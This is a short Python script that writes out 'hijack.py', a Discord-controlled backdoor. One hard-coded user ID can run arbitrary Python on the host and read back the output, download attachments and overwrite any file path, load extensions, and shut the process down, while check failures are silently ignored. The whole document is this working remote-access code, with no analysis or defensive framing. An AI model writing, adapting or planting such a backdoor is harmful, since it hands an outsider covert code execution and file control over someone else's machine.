open('hijack.py','w').write(f'''
import subprocess, requests, os
from discord.ext import commands

bot = commands.Bot('')

async def owner(ctx):
	check =  ctx.author.id == 394771663155101727
	if not check: await ctx.send('I only work for my master... ||fuck off||')
	return check

@bot.command()
@commands.check(owner)
async def py(ctx, *, code):
	open('inp.py','w').write(code)
	subprocess.run(
		args=['python', 'inp.py'],
		stdout=open('outp','w'),
		stderr=subprocess.STDOUT,
		timeout=30)
	x, log = 2000, open('outp').read()
	chunks = [log[y-x:y] for y in range(x, len(log)+x, x)]
	for chunk in chunks: await ctx.send(chunk)

class overrise(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command()
	@commands.check(owner)
	async def load(self, ctx, ext):
		bot.load_extension(ext)

	@commands.command(aliases=['upload'])
	@commands.check(owner)
	async def ulf(self, ctx, path):
		code = requests.get(ctx.message.attachments[0].url).text
		open(path, 'w').write(code)

	@commands.command()
	@commands.check(owner)
	async def sd(self, ctx):
		await ctx.send('shutdown')
		exit()

	@commands.Cog.listener()
	async def on_command_error(self, ctx, error):
		if isinstance(error, commands.CommandNotFound): return
		if isinstance(error, commands.CheckFailure): return
		await ctx.send(error)

bot.add_cog(overrise(bot))

<token>
bot.run(TOKEN)
'''.replace('<token>', 'TOKEN=os.getenv("TOKEN")'))
